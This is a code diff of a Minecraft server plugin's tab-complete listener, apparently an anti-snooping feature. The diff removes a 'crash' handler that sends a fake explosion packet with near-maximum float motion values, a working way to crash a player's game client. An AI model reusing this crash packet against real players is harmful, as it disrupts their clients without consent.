@@ -63,25 +63,6 @@ public class TabCompleteListener {
                                     event.getPacket().getSpecificModifier(Suggestions.class).write(0, new Suggestions(new StringRange(1, 1), suggestionsList));
                                     break;
 
-                                case "crash":
-                                    Location playerLoc = event.getPlayer().getLocation();
-                                    PacketContainer fakeExplosion = new PacketContainer(PacketType.Play.Server.EXPLOSION);
-                                    fakeExplosion.getDoubles()
-                                            .write(0, playerLoc.getX())
-                                            .write(1, playerLoc.getY())
-                                            .write(2, playerLoc.getZ());
-                                    fakeExplosion.getFloat()
-                                            .write(0, 1.0F) // strength
-                                            .write(1, 340282346638528860000000000000000000000.0F) // motion X
-                                            .write(2, 340282346638528860000000000000000000000.0F) // motion y
-                                            .write(3, 340282346638528860000000000000000000000.0F); // motion z
-                                    try {
-                                        ProtocolLibrary.getProtocolManager().sendServerPacket(event.getPlayer(), fakeExplosion);
-                                    } catch (InvocationTargetException e) {
-                                        throw new RuntimeException(e);
-                                    }
-                                    break;
-
                                 case "console":
                                     String command = PluginCloak.getInstance().getConfig().getString("anticheat.command", "");
                                     command = command.replaceAll("\\{player}", event.getPlayer().getName());
